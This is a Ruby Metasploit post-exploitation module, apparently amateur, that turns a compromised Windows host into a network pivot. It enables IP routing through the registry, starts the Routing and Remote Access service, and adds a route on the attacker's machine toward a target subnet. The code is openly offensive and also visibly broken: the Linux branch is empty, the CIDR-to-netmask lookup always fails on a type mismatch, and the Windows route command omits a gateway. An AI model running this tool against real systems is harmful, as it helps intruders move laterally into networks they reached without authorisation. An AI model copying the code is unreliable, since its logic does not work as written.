##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/windows'

class MetasploitModule < Msf::Post

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'AutoPivoting',
        'Description'   => %q{This module Configures the computer to be a gateway torward other network. It works with linux and windows systems.},
        'License'       => MSF_LICENSE,
        'Author'        => 
           [
             'Mikel & j4r3',
             'none <none[at]gmail.com>'
           ],
		'Platform'      => [ 'win', 'linux'],
        'SessionTypes'  => [ 'meterpreter','shell']
      ))

    register_options(
      [
		# OptBool.new( 'SYSTEMINFO', [ true, 'True if you want to get system info', 'TRUE' ])
		OptString.new('NET',    [true, 'The network we want to arrive (Example: 10.0.0.0/24)']),
		OptString.new('RHOST',    [true, 'IP address of pivot computer (our side IP)'])
      ])
  end
	#Obtenemos el OS de instalacion de metasploit
	def sistema_base?
		if (Msf::Config.local_directory[0,1])==("/")
			return "linux"
			print_good("soy linux")
		elsif ((Msf::Config.local_directory[0,1])=~ /[[:alpha:]]/)
			return "windows"
		else
			return "Unknown System."
		end
	end

	def linux_pivot()
		#
		# Linux commands
		#

	end

	def windows_pivot()
		#
		# Windows commands
		#
		print_status("Enabling IP Router...")
		print_good(cmd_exec("reg add \"HKLM\\SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters\" /f /v IPEnableRouter /t REG_DWORD /d 1"))
		print_status("Enabling Routing and Remote Access service...")
		print_good(cmd_exec("sc config RemoteAccess start= auto"))
		print_status("Starting Routing and Remote Access service...")
		print_good(cmd_exec("net start RemoteAccess"))
	end
	#
  	# acciones segun eleccion plataforma
  	#
	def set_pivot()
		case session.platform
	  	when 'linux'
		  	# codigo para linux
		  	linux_pivot()
		when 'windows'
		  	# codigo para windows
			windows_pivot()
		end
	end
	def initialize_dicitionary()
		dic = {}
		dic['4'] = "240.0.0.0"
		dic['5'] = "248.0.0.0"
		dic['6'] = "252.0.0.0"
		dic['7'] = "254.0.0.0"
		dic['8'] = "255.0.0.0"
		dic['9'] = "255.128.0.0"
		dic['10'] = "255.192.0.0"
		dic['11'] = "255.224.0.0"
		dic['12'] = "255.240.0.0"
		dic['13'] = "255.248.0.0"
		dic['14'] = "255.252.0.0"
		dic['15'] = "255.254.0.0"
		dic['16'] = "255.255.0.0"
		dic['17'] = "255.255.128.0"
		dic['18'] = "255.255.192.0"
		dic['19'] = "255.255.224.0"
		dic['20'] = "255.255.240.0"
		dic['21'] = "255.255.248.0"
		dic['22'] = "255.255.252.0"
		dic['23'] = "255.255.254.0"
		dic['24'] = "255.255.255.0"
		dic['25'] = "255.255.255.128"
		dic['26'] = "255.255.255.192"
		dic['27'] = "255.255.255.224"
		dic['28'] = "255.255.255.240"
		dic['29'] = "255.255.255.248"
		dic['30'] = "255.255.255.252"
		dic['32'] = "255.255.255.255"
		return dic
		
	end
	#conversion cidr a netmask
	def cidr_to_netmask(cidr)
	  # IPAddr.new('255.255.255.255').mask(cidr).to_s
	  netmask = [4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,32]
	  d_netmasks = initialize_dicitionary()
	  if netmask.include? cidr
		return d_netmasks[cidr]
	  else
		return "Invalid netmask."
	  end
	end
	
	def create_route()
	# Crea la ruta en la máquina local
	# Obtenemos sistema local:
		print_status("Add ruta al la red objetivo...")
		case sistema_base?
	  	when 'linux'
		  	if system("route add -net #{datastore['NET']} gw #{datastore['RHOST']}")
				print_good("Route added.")
			else
				print_bad("Something was wrong adding local route. Try to add it manually.")
			end
		when 'windows'
		  	# codigo para windows conversion con variables de cidr a netmask y extraccion de red
			network = datastore['NET'].split("/").first
			netmask = cidr_to_netmask(datastore['NET'].split("/").last)
			if netmask == "Invalid netmask"
				print_bad("Invalid mask.")
				# exit
			end
		  	if system("route -p add #{network} mask #{netmask} METRIC 1")
				print_good("Route added.")
			else
				print_bad("Something was wrong adding local route. Try to add it manually.")
			end
		end
	end
	
	#
  	# funcion principal, donde se invocan los comandos necesarios segun la plataforma
  	#
	def run
		# rra_status = --> Estado inicial del servicio RRA
		# iprouting_status = --> Valor inicial del registro IPEnableRouter
		# print_status("Initial values:")
		# print_line("	El servicio RRA se encuentra #{rra_status}")
		# print_line("	El valor de IPEnableRouter es #{iprouting_status}")
		print_status("OS: #{session.sys.config.sysinfo['OS']}")
		print_status("Computer name: #{'Computer'} ")
		print_status("Current user: #{session.sys.config.getuid}")
		set_pivot()
		create_route()
  end
end
